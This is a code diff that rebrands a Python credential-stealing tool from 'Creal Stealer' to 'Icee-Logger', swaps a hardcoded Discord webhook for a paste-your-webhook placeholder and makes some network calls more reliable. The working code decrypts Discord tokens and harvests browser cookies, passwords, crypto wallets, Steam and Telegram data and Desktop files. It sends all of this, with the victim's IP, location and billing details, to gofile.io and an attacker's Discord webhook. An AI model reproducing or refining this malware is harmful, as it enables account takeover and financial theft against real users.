@@ -15,19 +15,22 @@ import random
 import re
 import subprocess
 
-
-hook = "https://discord.com/api/webhooks/1044905279004876800/GbncgK3kTkuctH5Ki1OM0CoJCp99_MCG_BSMZ83uj4Bss2GWhKfGq32WEDo6modUA2aS"
-
+# Please paste your Webhook Here!
+Webhook = "PASTE_YOUR_WEBHOOK_HERE"
 
 DETECTED = False
 
 def getip():
     ip = "None"
-    try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except:
-        pass
-    return ip
+    breakcounter = 0
+    while True:
+        if breakcounter >= 3: break
+        try:
+            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+            return ip
+        except:
+            breakcounter += 1
+            pass
 
 requirements = [
     ["requests", "requests"],
@@ -112,10 +115,16 @@ def LoadUrlib(hook, data='', files='', headers=''):
 def globalInfo():
     ip = getip()
     username = os.getenv("USERNAME")
-    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
-    # print(ipdatanojson)
+    breakcount = 0
+    while True:
+        if breakcount >= 3: break
+        try:
+            ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
+            break
+        except:
+            breakcount += 1
+            pass
     ipdata = loads(ipdatanojson)
-    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
     contry = ipdata["country_name"]
     contryCode = ipdata["country_code"].lower()
     sehir = ipdata["state"]
@@ -125,11 +134,9 @@ def globalInfo():
 
 
 def Trust(Cookies):
-    # simple Trust Factor system
     global DETECTED
     data = str(Cookies)
     tim = re.findall(".google.com", data)
-    # print(len(tim))
     if len(tim) < -1:
         DETECTED = True
         return DETECTED
@@ -263,7 +270,7 @@ def checkToken(token):
 
 
 def uploadToken(token, path):
-    global hook
+    global Webhook
     global myhook
     headers = {
         "Content-Type": "application/json",
@@ -272,7 +279,7 @@ def uploadToken(token, path):
     username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
 
     if pfp == None: 
-        pfp = "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+        pfp = "https://cdn.discordapp.com/attachments/1045019709793374320/1045020096805998603/ice_cube.png"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -306,7 +313,7 @@ def uploadToken(token, path):
                     "inline": True
                 },
                 {
-                    "name": "<:mc_earth:589630396476555264> IP:",
+                    "name": "<:mc_earth:589630396476555264> IP Address:",
                     "value": f"```{getip()}```",
                     "inline": True
                 },
@@ -316,7 +323,7 @@ def uploadToken(token, path):
                     "inline": True
                 },
                 {
-                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
+                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing Information:",
                     "value": f"{billing}",
                     "inline": True
                 },
@@ -331,19 +338,19 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Creal Stealer",
-                "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+                "text": "Icee-Logger",
+                "icon_url": "https://cdn.discordapp.com/attachments/1045019709793374320/1045020096805998603/ice_cube.png"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
-        "username": "Creal Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1045019709793374320/1045020096805998603/ice_cube.png",
+        "username": "Icee-Logger",
         "attachments": []
         }
-    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+    LoadUrlib(Webhook, data=dumps(data).encode(), headers=headers)
 
 
 def Reformat(listt):
@@ -368,20 +375,20 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Cookies Stealer",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
+                    "title": "Icee-Logger | Cookies",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Victim's Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                     "color": 000000,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+                        "text": "Icee-Logger",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1045019709793374320/1045020096805998603/ice_cube.png"
                     }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
+            "username": "Icee-Logger",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1045019709793374320/1045020096805998603/ice_cube.png",
             "attachments": []
             }
-        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        LoadUrlib(Webhook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "wppassw":
@@ -394,20 +401,20 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Password Stealer",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
+                    "title": "Icee-Logger | Passwords",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Victim's Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                     "color": 000000,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+                        "text": "Icee-Logger",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1045019709793374320/1045020096805998603/ice_cube.png"
                     }
                 }
             ],
-            "username": "Creal",
-            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
+            "username": "Icee-Logger",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1045019709793374320/1045020096805998603/ice_cube.png",
             "attachments": []
             }
-        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        LoadUrlib(Webhook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "kiwi":
@@ -418,46 +425,30 @@ def upload(name, link):
                 "color": 000000,
                 "fields": [
                     {
-                    "name": "Interesting files found on user PC:",
+                    "name": "Very Interesting Files Found:",
                     "value": link
                     }
                 ],
                 "author": {
-                    "name": "Creal | File Stealer"
+                    "name": "Icee-Logger | Files"
                 },
                 "footer": {
-                    "text": "Creal Stealer",
-                    "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+                    "text": "Icee-Logger",
+                    "icon_url": "https://cdn.discordapp.com/attachments/1045019709793374320/1045020096805998603/ice_cube.png"
                 }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
+            "username": "Icee-Logger",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1045019709793374320/1045020096805998603/ice_cube.png",
             "attachments": []
             }
-        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        LoadUrlib(Webhook, data=dumps(data).encode(), headers=headers)
         return
-
-
-
-
-# def upload(name, tk=''):
-#     headers = {
-#         "Content-Type": "application/json",
-#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-#     }
-
-#     # r = requests.post(hook, files=files)
-#     LoadRequests("POST", hook, files=files)
-    _
-
-
-
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--Creal STEALER BEST -->\n\n")
+        f.write(f"<-- Icee-Logger On Top! -->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -475,7 +466,6 @@ def getToken(path, arg):
                         global Tokens
                         if checkToken(token):
                             if not token in Tokens:
-                                # print(token)
                                 Tokens += token
                                 uploadToken(token, path)
 
@@ -563,10 +553,8 @@ def GetDiscord(path, arg):
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
-    # print(path, master_key)
     
     for file in os.listdir(pathC):
-        # print(path, file)
         if file.endswith(".log") or file.endswith(".ldb")   :
             for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                 for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
@@ -574,9 +562,7 @@ def GetDiscord(path, arg):
                     tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                     if checkToken(tokenDecoded):
                         if not tokenDecoded in Tokens:
-                            # print(token)
                             Tokens += tokenDecoded
-                            # writeforfile(Tokens, 'tokens')
                             uploadToken(tokenDecoded, path)
 
 def GatherZips(paths1, paths2, paths3):
@@ -598,7 +584,6 @@ def GatherZips(paths1, paths2, paths3):
     for thread in thttht: 
         thread.join()
     global WalletsZip, GamingZip, OtherZip
-        # print(WalletsZip, GamingZip, OtherZip)
 
     wal, ga, ot = "",'',''
     if not len(WalletsZip) == 0:
@@ -622,20 +607,20 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "Creal Zips",
+            "title": "Icee-Logger | Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 000000,
             "footer": {
-                "text": "Creal Stealer",
-                "icon_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png"
+                "text": "Icee-Logger",
+                "icon_url": "https://cdn.discordapp.com/attachments/1045019709793374320/1045020096805998603/ice_cube.png"
             }
             }
         ],
-        "username": "Creal Stealer",
-        "avatar_url": "https://media.discordapp.net/attachments/1039243152487362620/1041283112065310730/meme.png",
+        "username": "Icee-Logger",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1045019709793374320/1045020096805998603/ice_cube.png",
         "attachments": []
     }
-    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+    LoadUrlib(Webhook, data=dumps(data).encode(), headers=headers)
 
 
 def ZipTelegram(path, arg, procc):
@@ -652,7 +637,6 @@ def ZipTelegram(path, arg, procc):
     zf.close()
 
     lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    #lnik = "https://google.com"
     os.remove(f"{pathC}/{name}.zip")
     OtherZip.append([arg, lnik])
 
@@ -660,8 +644,6 @@ def ZipThings(path, arg, procc):
     pathC = path
     name = arg
     global WalletsZip, GamingZip, OtherZip
-    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
-    # os.system(f"taskkill /im {procc} /t /f")
 
     if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
@@ -679,7 +661,6 @@ def ZipThings(path, arg, procc):
         if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
         f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
         data = f.readlines()
-        # print(data)
         found = False
         for l in data:
             if 'RememberPassword"\t\t"1"' in l:
@@ -694,7 +675,6 @@ def ZipThings(path, arg, procc):
     zf.close()
 
     lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    #lnik = "https://google.com"
     os.remove(f"{pathC}/{name}.zip")
 
     if "Wallet" in arg or "eogaeaoehlef" in arg:
@@ -782,15 +762,6 @@ def uploadToAnonfiles(path):
     try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
     except:return False
 
-# def uploadToAnonfiles(path):s
-#     try:
-#         files = { "file": (path, open(path, mode='rb')) }
-#         upload = requests.post("https://transfer.sh/", files=files)
-#         url = upload.text
-#         return url
-#     except:
-#         return False
-
 def KiwiFolder(pathF, keywords):
     global KiwiFiles
     maxfilesperdir = 7
@@ -811,7 +782,11 @@ KiwiFiles = []
 def KiwiFile(path, keywords):
     global KiwiFiles
     fifound = []
-    listOfFile = os.listdir(path)
+    listOfFile = ""
+    try:
+        listOfFile = os.listdir(path.replace("/", "\\"))
+    except:
+        listOfFile = os.listdir(path.replace("/", "\\").replace("Desktop", "OneDrive\\Desktop"))
     for file in listOfFile:
         for worf in keywords:
             if worf in file.lower():
